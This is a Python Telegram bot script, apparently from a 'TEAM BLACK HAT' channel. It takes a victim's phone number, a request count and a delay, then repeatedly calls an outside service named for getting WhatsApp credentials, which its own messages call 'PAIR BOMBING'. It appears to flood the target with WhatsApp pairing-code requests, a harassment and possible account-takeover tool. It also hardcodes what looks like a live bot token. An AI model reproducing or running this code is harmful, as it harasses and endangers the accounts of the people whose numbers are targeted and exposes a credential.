import requests

import asyncio

from telegram import Update, ReplyKeyboardRemove

from telegram.ext import (

    ApplicationBuilder, CommandHandler, MessageHandler, filters,

    ConversationHandler, ContextTypes

)

# States

ENTRY_NUMBER, AMOUNT_PAIRS, DELAY = range(3)

# Required channel username (without @)

REQUIRED_CHANNEL = "EshaLinks1"

# Start command with join check

async def is_user_joined(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:

    try:

        member = await context.bot.get_chat_member(chat_id=f"@{REQUIRED_CHANNEL}", user_id=update.effective_user.id)

        return member.status in ['member', 'administrator', 'creator']

    except:

        return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if not await is_user_joined(update, context):

        await update.message.reply_text(

            "🔐 *YOU MUST JOIN THE CHANNEL TO USE THIS BOT!*\n\n👉 JOIN HERE: [TEAM BLACK HAT](https://t.me/team_black_hat786)",

            parse_mode="Markdown",

            disable_web_page_preview=True

        )

        return ConversationHandler.END

    await update.message.reply_text("🔢 *ENTRY NUMBER FOR PAIR*\n\nEXAMPLE +923000000000", parse_mode="Markdown")

    return ENTRY_NUMBER

async def entry_number(update: Update, context: ContextTypes.DEFAULT_TYPE):

    context.user_data['entry_number'] = update.message.text.strip()

    await update.message.reply_text("💰 *ENTER AMOUNT OF PAIRS*", parse_mode="Markdown")

    return AMOUNT_PAIRS

async def amount_pairs(update: Update, context: ContextTypes.DEFAULT_TYPE):

    try:

        amount = int(update.message.text.strip())

        context.user_data['amount_pairs'] = amount

        await update.message.reply_text("⏱ *ENTER SCE OF DELAY*", parse_mode="Markdown")

        return DELAY

    except:

        await update.message.reply_text("❌ Invalid AMOUNT. PLEASE ENTER A NUMBER.")

        return AMOUNT_PAIRS

async def delay(update: Update, context: ContextTypes.DEFAULT_TYPE):

    try:

        context.user_data['delay'] = float(update.message.text.strip())

        number = context.user_data['entry_number']

        amount = context.user_data['amount_pairs']

        delay_seconds = context.user_data['delay']

        await update.message.reply_text(

            f"📡 STARTING {amount} PAIR BOMBING {delay_seconds} sec delay...\nPlease wait..."

        )

        for i in range(amount):

            try:

                api_url = f"https://get-wp-creds-json-and-access-token.onrender.com/code?number={number}"

                response = requests.get(api_url)

                result = response.text if response.status_code == 200 else "❌ API Error"

            except Exception as e:

                result = f"⚠️ Error: {e}"

            await update.message.reply_text(f"🔁 REQUEST {i+1}:\n{result}")

            await asyncio.sleep(delay_seconds)

        await update.message.reply_text("✅ ALL REQUESTS COMPLETED.")

        return ConversationHandler.END

    except:

        await update.message.reply_text("❌ INVALID DELAY. PLEASE ENTER A NUMBER like 1 or 0.5.")

        return DELAY

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):

    await update.message.reply_text("❌ Cancelled.", reply_markup=ReplyKeyboardRemove())

    return ConversationHandler.END

# ✅ Bot token you provided

BOT_TOKEN = "7195736002:AAGv5aINVC3UiA6EGRuQEllnha5cvGxWKnk"

# Setup bot

app = ApplicationBuilder().token(BOT_TOKEN).build()

conv_handler = ConversationHandler(

    entry_points=[CommandHandler("start", start)],

    states={

        ENTRY_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, entry_number)],

        AMOUNT_PAIRS: [MessageHandler(filters.TEXT & ~filters.COMMAND, amount_pairs)],

        DELAY: [MessageHandler(filters.TEXT & ~filters.COMMAND, delay)],

    },

    fallbacks=[CommandHandler("cancel", cancel)],

)

app.add_handler(conv_handler)

print("🤖 Bot is running...")

app.run_polling()